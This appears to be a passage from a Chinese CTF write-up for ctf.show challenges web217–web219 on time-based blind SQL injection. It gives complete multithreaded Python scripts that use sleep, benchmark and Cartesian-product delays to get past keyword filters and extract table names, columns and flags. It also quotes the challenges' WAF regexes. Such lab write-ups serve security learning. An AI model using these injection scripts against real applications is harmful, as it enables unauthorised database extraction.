&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = &amp;quot;http://63681fa7-d5ab-46e8-925f-001bfe6986da.challenge.ctf.show/api/&amp;quot;
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-_,&amp;quot; # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 2      # payload中sleep的秒数

# ★ payload格式
# 查数据库
# TARGET_QUERY = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

# 查列名
# TARGET_QUERY = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagxcc&amp;#39;&amp;quot;

# 查数据
TARGET_QUERY = &amp;quot;select flagaac from ctfshow_flagxcc&amp;quot;
PAYLOAD_TEMPLATE = &amp;quot;&amp;#39;MQ==&amp;#39;) or if(ascii(substr((&amp;#123;query&amp;#125;),&amp;#123;pos&amp;#125;,1))=ascii(&amp;#39;&amp;#123;char&amp;#125;&amp;#39;),sleep(&amp;#123;sleep&amp;#125;),1)#&amp;quot;
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    &amp;quot;&amp;quot;&amp;quot;测试某一位的某个字符&amp;quot;&amp;quot;&amp;quot;
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, sleep=SLEEP_TIME)
    data = &amp;#123;
        &amp;#39;ip&amp;#39;: payload,      # post参数
        &amp;#39;debug&amp;#39;: &amp;#39;0&amp;#39;        # post参数
    &amp;#125;

    start = time.time()
    try:
        session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了

    elapsed = time.time() - start
    if DEBUG:
        print(f&amp;quot;[DEBUG] pos=&amp;#123;pos&amp;#125;, try=&amp;#39;&amp;#123;ch&amp;#125;&amp;#39;, time=&amp;#123;elapsed:.2f&amp;#125;s&amp;quot;)

    if elapsed &amp;gt;= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = &amp;quot;&amp;quot;
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = &amp;#123;executor.submit(test_char, session, i, ch): ch for ch in CHARSET&amp;#125;
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break

        if found:
            flag += found
            print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
        else:
            print(&amp;quot;[*] 爆破结束&amp;quot;)
            break

    return flag

if __name__ == &amp;quot;__main__&amp;quot;:
    result = extract_flag()
    print(f&amp;quot;\n最终结果: &amp;#123;result&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web217&#34;&gt;&lt;a href=&#34;#web217&#34; class=&#34;headerlink&#34; title=&#34;web217&#34;&gt;&lt;/a&gt;web217&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;开始基于时间盲注


查询语句
       where id = ($id);


返回逻辑
//屏蔽危险分子
    function waf($str)&amp;#123;
        return preg_match(&amp;#39;/sleep/i&amp;#39;,$str);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;benchmark&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基本语法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;BENCHMARK(loop_count, expression)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：把 &lt;code&gt;expression&lt;/code&gt; 这个表达式执行 &lt;code&gt;loop_count&lt;/code&gt; 次，然后返回 &lt;code&gt;0&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;返回值总是 &lt;code&gt;0&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主要用途是耗时&lt;/strong&gt;（用来测试数据库性能，或者在注入里“拖延时间”）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;举例说明&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT BENCHMARK(1000000, MD5(&amp;#39;test&amp;#39;));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;含义：计算 &lt;code&gt;MD5(&amp;#39;test&amp;#39;)&lt;/code&gt; 一百万次。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行起来非常慢，数据库 CPU 飙高。&lt;/li&gt;
&lt;li&gt;最终返回 &lt;code&gt;0&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看表名&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250829235407210.png&#34; alt=&#34;image-20250829235407210&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看字段&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250829235743971.png&#34; alt=&#34;image-20250829235743971&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250830000202252.png&#34; alt=&#34;image-20250830000202252&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = &amp;quot;http://bf1e7246-382d-496d-b1a5-8bc2dc767ab5.challenge.ctf.show/api/&amp;quot;
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-_,&amp;quot; # 字符集要齐全
MAX_LEN = 50        # 最大爆破长度，避免无限循环
THREADS = 10        # 使用的线程数，代表同时测试多少个字符
DEBUG = False       # 调试开关，设为True会打印详细调试信息（比如每次尝试的字符和耗时）
TIME_THRESHOLD = 0.5  # 响应时间超过多少秒判定为正确字符
# SLEEP_TIME = 2      # payload中sleep的秒数
BENCHMARK_COUNT = &amp;quot;10000000&amp;quot;  # benchmark计算量

# ★ payload格式
# 查数据库
# TARGET_QUERY = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

# 查列名
# TARGET_QUERY = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagxccb&amp;#39;&amp;quot;

# 查数据
TARGET_QUERY = &amp;quot;select flagaabc from ctfshow_flagxccb&amp;quot;
PAYLOAD_TEMPLATE = &amp;quot;1) or if(ascii(substr((&amp;#123;query&amp;#125;),&amp;#123;pos&amp;#125;,1))=ascii(&amp;#39;&amp;#123;char&amp;#125;&amp;#39;),benchmark(&amp;#123;count&amp;#125;,sha(1)),1)#&amp;quot;
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    &amp;quot;&amp;quot;&amp;quot;测试某一位的某个字符&amp;quot;&amp;quot;&amp;quot;
    payload = PAYLOAD_TEMPLATE.format(query=TARGET_QUERY, pos=pos, char=ch, count=BENCHMARK_COUNT)
    data = &amp;#123;
        &amp;#39;ip&amp;#39;: payload,      # post参数
        &amp;#39;debug&amp;#39;: &amp;#39;0&amp;#39;        # post参数
    &amp;#125;

    start = time.time()
    try:
        # session.post(url=URL, data=data, timeout=SLEEP_TIME + 2)
        session.post(url=URL, data=data, timeout=TIME_THRESHOLD + 5)
    except requests.exceptions.RequestException:
        pass  # 超时异常表明sleep被执行了

    elapsed = time.time() - start
    if DEBUG:
        print(f&amp;quot;[DEBUG] pos=&amp;#123;pos&amp;#125;, try=&amp;#39;&amp;#123;ch&amp;#125;&amp;#39;, time=&amp;#123;elapsed:.2f&amp;#125;s&amp;quot;)

    if elapsed &amp;gt;= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = &amp;quot;&amp;quot;
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = &amp;#123;executor.submit(test_char, session, i, ch): ch for ch in CHARSET&amp;#125;
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    # 找到正确字符后取消其他任务
                    for f in futures:
                        f.cancel()
                    break

        if found:
            flag += found
            print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
        else:
            print(&amp;quot;[*] 爆破结束&amp;quot;)
            break

    return flag

if __name__ == &amp;quot;__main__&amp;quot;:
    result = extract_flag()
    print(f&amp;quot;\n最终结果: &amp;#123;result&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web218&#34;&gt;&lt;a href=&#34;#web218&#34; class=&#34;headerlink&#34; title=&#34;web218&#34;&gt;&lt;/a&gt;web218&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;开始基于时间盲注


查询语句
       where id = ($id);


返回逻辑
//屏蔽危险分子
    function waf($str)&amp;#123;
        return preg_match(&amp;#39;/sleep|benchmark/i&amp;#39;,$str);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;笛卡尔积&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;笛卡尔积定义&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在数据库中，&lt;strong&gt;笛卡尔积&lt;/strong&gt;指的是在没有任何连接条件的情况下，把两张表的所有记录进行两两组合，生成的结果集。&lt;/p&gt;
&lt;p&gt;换句话说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果表 A 有 &lt;code&gt;m&lt;/code&gt; 行，表 B 有 &lt;code&gt;n&lt;/code&gt; 行；&lt;/li&gt;
&lt;li&gt;那么 &lt;code&gt;A × B&lt;/code&gt; 的结果就是 &lt;code&gt;m * n&lt;/code&gt; 行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是数学里笛卡尔积的概念在 SQL 里的体现。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL 示例&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假设有两张表：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表 student&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;张三&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;李四&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;表 course&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;cname&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;数学&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;102&lt;/td&gt;
&lt;td&gt;英语&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;103&lt;/td&gt;
&lt;td&gt;计算机&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;查询笛卡尔积&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT *
FROM student, course;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或等价写法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT *
FROM student CROSS JOIN course;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;name&lt;/th&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;cname&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;张三&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;数学&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;张三&lt;/td&gt;
&lt;td&gt;102&lt;/td&gt;
&lt;td&gt;英语&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;张三&lt;/td&gt;
&lt;td&gt;103&lt;/td&gt;
&lt;td&gt;计算机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;李四&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;数学&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;李四&lt;/td&gt;
&lt;td&gt;102&lt;/td&gt;
&lt;td&gt;英语&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;李四&lt;/td&gt;
&lt;td&gt;103&lt;/td&gt;
&lt;td&gt;计算机&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;结果有 &lt;code&gt;2 × 3 = 6&lt;/code&gt; 行。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;笛卡尔积的用途&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;作为 JOIN 的基础&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;笛卡尔积是 SQL 中连接运算的基础。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;实际上，&lt;code&gt;INNER JOIN&lt;/code&gt; 本质就是先做笛卡尔积，然后筛选出满足连接条件的记录。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT *
FROM student, course
WHERE student.id = course.id;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里就是在笛卡尔积的结果里加了 &lt;code&gt;WHERE&lt;/code&gt; 条件，才变成有意义的连接。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;生成组合&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;有时我们需要所有可能的组合情况（比如试卷题库出题组合、投资组合），笛卡尔积可以直接拿来用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看表名&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250830173433429.png&#34; alt=&#34;image-20250830173433429&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看字段&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250830173353600.png&#34; alt=&#34;image-20250830173353600&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250830174028617.png&#34; alt=&#34;image-20250830174028617&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ===================== 配置区 =====================

url = &amp;#39;http://e0128c90-5547-45f7-9e77-98236aedee81.challenge.ctf.show/api/&amp;#39;  # 目标 URL
flagstr = &amp;#39;asdfghjklqwertyuiopzxcvbnm1234567890-_&amp;#123;&amp;#125;,&amp;#39;  # 可用字符集
max_len = 50  # 需要爆破的最大长度
timeout = 0.20  # 请求超时时间（秒）

# 查数据库
# query = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

# 查列名
# query = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagxc&amp;#39;&amp;quot;

# 查数据
query = &amp;quot;select flagaac from ctfshow_flagxc&amp;quot;  # 用于爆 flag 的查询

# ===================== 配置区结束 =====================

flag = &amp;#39;&amp;#39;

# 爆破过程
for i in range(1, max_len + 1):
    found = False  # 标记是否找到字符
    for x in flagstr:
        # 构造 payload
        payload = f&amp;quot;if(substr((&amp;#123;query&amp;#125;),&amp;#123;i&amp;#125;,1)=&amp;#39;&amp;#123;x&amp;#125;&amp;#39;,(select count(*) from information_schema.columns A,information_schema.columns B),1)&amp;quot;

        data = &amp;#123;&amp;#39;ip&amp;#39;: payload, &amp;#39;debug&amp;#39;: 1&amp;#125;  # 将 payload 放入 data 参数

        try:
            # 发送 POST 请求
            res = requests.post(url=url, data=data, timeout=timeout)
        except requests.exceptions.RequestException:
            flag += x  # 如果超时则认为是正确字符
            found = True  # 找到正确字符

            # 输出当前进度
            print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
            break

    if not found:
        print(&amp;quot;[*] 爆破结束&amp;quot;)
        break

# 输出最终结果
print(f&amp;quot;\n最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web219&#34;&gt;&lt;a href=&#34;#web219&#34; class=&#34;headerlink&#34; title=&#34;web219&#34;&gt;&lt;/a&gt;web219&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;开始基于时间盲注


